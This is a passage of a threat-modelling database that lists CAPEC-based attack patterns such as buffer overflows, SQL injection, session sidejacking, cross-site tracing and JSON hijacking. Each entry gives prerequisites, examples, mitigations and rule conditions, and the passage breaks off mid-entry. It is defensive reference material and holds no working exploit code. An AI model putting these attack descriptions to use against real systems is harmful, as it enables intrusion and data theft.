# Threat database
## INP01 Buffer Overflow via Environment Variables

This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the attacker finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The application uses environment variables.An environment variable exposed to the user is vulnerable to a buffer overflow.The vulnerable environment variable uses untrusted data.Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.</dd>

  <dt>Example</dt>
  <dd>Attack Example: Buffer Overflow in $HOME A buffer overflow in sccw allows local users to gain root access via the $HOME environmental variable. Attack Example: Buffer Overflow in TERM A buffer overflow in the rlogin program involves its consumption of the TERM environmental variable.</dd>

  <dt>Mitigations</dt>
  <dd>Do not expose environment variable to the user.Do not use untrusted data in your environment variables. Use a language or compiler that performs automatic bounds checking. There are tools such as Sharefuzz [R.10.3] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/10.html, CVE-1999-0906, CVE-1999-0046, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html</dd>

  <dt>Condition</dt>
  <dd>target.usesEnvironmentVariables is True and target.controls.sanitizesInput is False and target.controls.checksInputBounds is False</dd>
</dl>



## INP02 Overflow Buffers

Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>Targeted software performs buffer operations.Targeted software inadequately performs bounds-checking on buffer operations.Adversary has the capability to influence the input to buffer operations.</dd>

  <dt>Example</dt>
  <dd>The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.</dd>

  <dt>Mitigations</dt>
  <dd>Use a language or compiler that performs automatic bounds checking. Use secure functions not vulnerable to buffer overflow. If you have to use dangerous functions, make sure that you do boundary checking. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Use OS-level preventative functionality. Not a complete solution. Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/100.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/119.html, http://cwe.mitre.org/data/definitions/680.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.checksInputBounds is False</dd>
</dl>



## INP03 Server Side Include (SSI) Injection

An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>A web server that supports server side includes and has them enabledUser controllable input that can carry include directives to the web server</dd>

  <dt>Example</dt>
  <dd>Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.</dd>

  <dt>Mitigations</dt>
  <dd>Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them. All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive. Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/101.html, http://cwe.mitre.org/data/definitions/97.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/713.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.sanitizesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## CR01 Session Sidejacking

Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>An attacker and the victim are both using the same WiFi network.The victim has an active session with a target system.The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically rings home asynchronously using the session token</dd>

  <dt>Example</dt>
  <dd>The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, he has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but his e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account.</dd>

  <dt>Mitigations</dt>
  <dd>Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel. Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/102.html, http://cwe.mitre.org/data/definitions/294.html, http://cwe.mitre.org/data/definitions/614.html, http://cwe.mitre.org/data/definitions/319.html, http://cwe.mitre.org/data/definitions/523.html, http://cwe.mitre.org/data/definitions/522.html</dd>

  <dt>Condition</dt>
  <dd>(target.protocol == 'HTTP' or target.usesVPN is False) and target.usesSessionTokens is True</dd>
</dl>



## INP04 HTTP Request Splitting

HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack pattern where an attacker attempts to insert additional HTTP requests in the body of the original (enveloping) HTTP request in such a way that the browser interprets it as one request but the web server interprets it as two. There are several ways to perform HTTP request splitting attacks. One way is to include double Content-Length headers in the request to exploit the fact that the devices parsing the request may each use a different header. Another way is to submit an HTTP request with a Transfer Encoding: chunked in the request header set with setRequestHeader to allow a payload in the HTTP Request that can be considered as another HTTP Request by a subsequent parsing entity. A third way is to use the Double CR in an HTTP header technique. There are also a few less general techniques targeting specific parsing vulnerabilities in certain web servers.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>User-manipulateable HTTP Request headers are processed by the web server</dd>

  <dt>Example</dt>
  <dd>Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote attacker to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows attackers to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the attacker to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates</dd>

  <dt>Mitigations</dt>
  <dd>Make sure to install the latest vendor security patches available for the web server. If possible, make use of SSL. Install a web application firewall that has been secured against HTTP Request Splitting. Use web servers that employ a tight HTTP parsing process.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/105.html, http://cwe.mitre.org/data/definitions/436.html, http://cwe.mitre.org/data/definitions/444.html</dd>

  <dt>Condition</dt>
  <dd>(target.controls.validatesInput is False or target.controls.validatesHeaders is False) and target.protocol =='HTTP'</dd>
</dl>



## CR02 Cross Site Tracing

Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to destination system's web server. The adversary first gets a malicious script to run in the victim's browser that induces the browser to initiate an HTTP TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since the HTTP header of the original request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the adversary's malicious site. XST becomes relevant when direct access to the session cookie via the document.cookie object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST. If the system with which the victim is interacting is susceptible to XSS, an adversary can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE request to the destination system's web server. In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that he controls and get it to execute in the victim's browser (if he can trick the victim's into visiting his malicious website or clicking on the link that he supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable him or her to get around the same origin policy protection.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>HTTP TRACE is enabled on the web serverThe destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policyScripting is enabled in the client's browserHTTP is used as the communication protocol between the server and the client</dd>

  <dt>Example</dt>
  <dd>An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with his malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system.</dd>

  <dt>Mitigations</dt>
  <dd>Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default. Patch web browser against known security origin policy bypass exploits.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/107.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/648.html</dd>

  <dt>Condition</dt>
  <dd>(target.protocol == 'HTTP' and target.usesSessionTokens is True) and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)</dd>
</dl>



## INP05 Command Line Execution through SQL Injection

An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>The application does not properly validate data before storing in the databaseBackend application implicitly trusts the data stored in the databaseMalicious data is used on the backend as a command line argument</dd>

  <dt>Example</dt>
  <dd>SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function</dd>

  <dt>Mitigations</dt>
  <dd>Disable MSSQL xp_cmdshell directive on the databaseProperly validate the data (syntactically and semantically) before writing it to the database. Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/108.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/78.html, http://cwe.mitre.org/data/definitions/114.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False</dd>
</dl>



## INP06 SQL Injection through SOAP Parameter Tampering

An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>SOAP messages are used as a communication mechanism in the systemSOAP parameters are not properly validated at the service providerThe service provider does not properly utilize parameter binding when building SQL queries</dd>

  <dt>Example</dt>
  <dd>An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. He notices that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies his payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure.</dd>

  <dt>Mitigations</dt>
  <dd>Properly validate and sanitize/reject user input at the service provider. Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query. At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/110.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/20.html</dd>

  <dt>Condition</dt>
  <dd>target.protocol == 'SOAP' and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)</dd>
</dl>



## SC01 JSON Hijacking (aka JavaScript Hijacking)

An attacker targets a system that uses JavaScript Object Notation (JSON) as a transport mechanism between the client and the server (common in Web 2.0 systems using AJAX) to steal possibly confidential information transmitted from the server back to the client inside the JSON object by taking advantage of the loophole in the browser's Same Origin Policy that does not prohibit JavaScript from one website to be included and executed in the context of another website. An attacker gets the victim to visit his or her malicious page that contains a script tag whose source points to the vulnerable system with a URL that requests a response from the server containing a JSON object with possibly confidential information. The malicious page also contains malicious code to capture the JSON object returned by the server before any other processing on it can take place, typically by overriding the JavaScript function used to create new objects. This hook allows the malicious code to get access to the creation of each object and transmit the possibly sensitive contents of the captured JSON object to the attackers' server. There is nothing in the browser's security model to prevent the attackers' malicious JavaScript code (originating from attacker's domain) to set up an environment (as described above) to intercept a JSON object response (coming from the vulnerable target system's domain), read its contents and transmit to the attackers' controlled site. The same origin policy protects the domain object model (DOM), but not the JSON.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>JSON is used as a transport mechanism between the client and the serverThe target server cannot differentiate real requests from forged requestsThe JSON object returned from the server can be accessed by the attackers' malicious code via a script tag</dd>

  <dt>Example</dt>
  <dd>Gmail service was found to be vulnerable to a JSON Hijacking attack that enabled an attacker to get the contents of the victim's address book. An attacker could send an e-mail to the victim's Gmail account (which ensures that the victim is logged in to Gmail when he or she receives it) with a link to the attackers' malicious site. If the victim clicked on the link, a request (containing the victim's authenticated session cookie) would be sent to the Gmail servers to fetch the victim's address book. This functionality is typically used by the Gmail service to get this data on the fly so that the user can be provided a list of contacts from which to choose the recipient of the e-mail. When the JSON object with the contacts came back, it was loaded into the JavaScript space via a script tag on the attackers' malicious page. Since the JSON object was never assigned to a local variable (which would have prevented a script from a different domain accessing it due to the browser's same origin policy), another mechanism was needed to access the data that it contained. That mechanism was overwriting the internal array constructor with the attackers' own constructor in order to gain access to the JSON object's contents. These contents could then be transferred to the site controlled by the attacker.</dd>

  <dt>Mitigations</dt>
  <dd>Ensure that server side code can differentiate between legitimate requests and forged requests. The solution is similar to protection against Cross Site Request Forger (CSRF), which is to use a hard to guess random nonce (that is unique to the victim's session with the server) that the attacker has no way of knowing (at least in the absence of other weaknesses). Each request from the client to the server should contain this nonce and the server should reject all requests that do not contain the nonce. On the client side, the system's design could make it difficult to get access to the JSON object content via the script tag. Since the JSON object is never assigned locally to a variable, it cannot be readily modified by the attacker before being used by a script tag. For instance, if while(1) was added to the beginning of the JavaScript returned by the server, trying to access it with a script tag would result in an infinite loop. On the other hand, legitimate client side code can remove the while(1) statement after which the JavaScript can be evaluated. A similar result can be achieved by surrounding the returned JavaScript with comment tags, or using other similar techniques (e.g. wrapping the JavaScript with HTML tags). Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session. 4. Ensure that to the extent possible, no sensitive data is passed from the server to the client via JSON objects. JavaScript was never intended to play that role, hence the same origin policy does not adequate address this scenario.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/111.html, http://cwe.mitre.org/data/definitions/345.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/352.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsNonce is False and any(d.format == 'JSON' for d in target.data)</dd>
</dl>



## LB01 API Manipulation

An adversary manipulates the use or processing of an Application Programming Interface (API) resulting in an adverse impact upon the security of the system implementing the API. This can allow the adversary to execute functionality not intended by the API implementation, possibly compromising the system which integrates the API. API manipulation can take on a number of forms including forcing the unexpected use of an API, or the use of an API in an unintended way. For example, an adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target system must expose API functionality in a manner that can be discovered and manipulated by an adversary. This may require reverse engineering the API syntax or decrypting/de-obfuscating client-server exchanges.</dd>

  <dt>Example</dt>
  <dd>Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc.</dd>

  <dt>Mitigations</dt>
  <dd>Always use HTTPS and SSL Certificates. Firewall optimizations to prevent unauthorized access to or from a private network. Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API. Use IP whitelisting and rate limiting.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/113.html, http://cwe.mitre.org/data/definitions/227.html</dd>

  <dt>Condition</dt>
  <dd>target.implementsAPI is True and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)</dd>
</dl>



## AA01 Authentication Abuse/ByPass

An attacker obtains unauthorized access to an application, service or device either through knowledge of the inherent weaknesses of an authentication mechanism, or by exploiting a flaw in the authentication scheme's implementation. In such an attack an authentication mechanism is functioning but a carefully controlled sequence of events causes the mechanism to grant access to the attacker. This attack may exploit assumptions made by the target's authentication procedures, such as assumptions regarding trust relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>An authentication mechanism or subsystem implementing some form of authentication such as passwords, digest authentication, security certificates, etc. which is flawed in some way.</dd>

  <dt>Example</dt>
  <dd>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</dd>

  <dt>Mitigations</dt>
  <dd>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.authenticatesSource is False</dd>
</dl>



## DS01 Excavation

An adversary actively probes the target in a manner that is designed to solicit information that could be leveraged for malicious purposes. This is achieved by exploring the target via ordinary interactions for the purpose of gathering intelligence about the target, or by sending data that is syntactically invalid or non-standard in an attempt to produce a response that contains the desired data. As a result of these interactions, the adversary is able to obtain information from the target that aids the attacker in making inferences about its security, configuration, or potential vulnerabilities. Examplar exchanges with the target may trigger unhandled exceptions or verbose error messages that reveal information like stack traces, configuration information, path information, or database design. This type of attack also includes the manipulation of query strings in a URI to produce invalid SQL queries, or by trying alternative path values in the hope that the server will return useful information.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>An adversary requires some way of interacting with the system.</dd>

  <dt>Example</dt>
  <dd>The adversary may collect this information through a variety of methods including active querying as well as passive observation. By exploiting weaknesses in the design or configuration of the target and its communications, an adversary is able to get the target to reveal more information than intended. Information retrieved may aid the adversary in making inferences about potential weaknesses, vulnerabilities, or techniques that assist the adversary's objectives. This information may include details regarding the configuration or capabilities of the target, clues as to the timing or nature of activities, or otherwise sensitive information. Often this sort of attack is undertaken in preparation for some other type of attack, although the collection of information by itself may in some cases be the end goal of the adversary.</dd>

  <dt>Mitigations</dt>
  <dd>Minimize error/response output to only what is necessary for functional use or corrective language. Remove potentially sensitive information that is not necessary for the application's functionality.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/116.html, http://cwe.mitre.org/data/definitions/200.html</dd>

  <dt>Condition</dt>
  <dd>(target.controls.sanitizesInput is False or target.controls.validatesInput is False) or target.controls.encodesOutput is False</dd>
</dl>



## DE01 Interception

An adversary monitors data streams to or from the target for information gathering purposes. This attack may be undertaken to solely gather sensitive information or to support a further attack against the target. This attack pattern can involve sniffing network traffic as well as other types of data streams (e.g. radio). The adversary can attempt to initiate the establishment of a data stream, influence the nature of the data transmitted, or passively observe the communications as they unfold. In all variants of this attack, the adversary is not the intended recipient of the data stream. In contrast to other means of gathering information (e.g., targeting data leaks), the adversary must actively position himself so as to observe explicit data channels (e.g. network traffic) and read the content.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must transmit data over a medium that is accessible to the adversary.</dd>

  <dt>Example</dt>
  <dd>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</dd>

  <dt>Mitigations</dt>
  <dd>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</dd>

  <dt>Condition</dt>
  <dd>not target.controls.isEncrypted or (target.source.inScope and not target.isResponse and (not target.controls.authenticatesDestination or not target.controls.checksDestinationRevocation)) or target.tlsVersion < target.sink.minTLSVersion</dd>
</dl>



## DE02 Double Encoding

The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target's filters must fail to detect that a character has been doubly encoded but its interpreting engine must still be able to convert a doubly encoded character to an un-encoded character.The application accepts and decodes URL string request.The application performs insufficient filtering/canonicalization on the URLs.</dd>

  <dt>Example</dt>
  <dd>Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.</dd>

  <dt>Mitigations</dt>
  <dd>Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## API01 Exploit Test APIs

An attacker exploits a sample, demonstration, or test API that is insecure by default and should not be resident on production systems. Some applications include APIs that are intended to allow an administrator to test and refine their domain. These APIs should usually be disabled once a system enters a production environment. Testing APIs may expose a great deal of diagnostic information intended to aid an administrator, but which can also be used by an attacker to further refine their attack. Moreover, testing APIs may not have adequate security controls or may not have undergone rigorous testing since they were not intended for use in production environments. As such, they may have many flaws and vulnerabilities that would allow an attacker to severely disrupt a target.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target must have installed test APIs and failed to secure or remove them when brought into a production environment.</dd>

  <dt>Example</dt>
  <dd>Since APIs can be accessed over the internet just like any other URI with some sensitive data attached to the request, they share the vulnerabilities of any other resource accessible on the internet like Man-in-the-middle, CSRF Attack, Denial of Services, etc.</dd>

  <dt>Mitigations</dt>
  <dd>Ensure that production systems to not contain sample or test APIs and that these APIs are only used in development environments.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/121.html, http://cwe.mitre.org/data/definitions/489.html</dd>

  <dt>Condition</dt>
  <dd>target.implementsAPI is True</dd>
</dl>



## AC01 Privilege Abuse

An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must have misconfigured their access control mechanisms such that sensitive information, which should only be accessible to more trusted users, remains accessible to less trusted users.The adversary must have access to the target, albeit with an account that is less privileged than would be appropriate for the targeted resources.</dd>

  <dt>Example</dt>
  <dd>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</dd>

  <dt>Mitigations</dt>
  <dd>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False or target.controls.authorizesSource is False</dd>
</dl>



## INP07 Buffer Manipulation

An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.</dd>

  <dt>Example</dt>
  <dd>Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.</dd>

  <dt>Mitigations</dt>
  <dd>To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.</dd>

  <dt>References</dt>
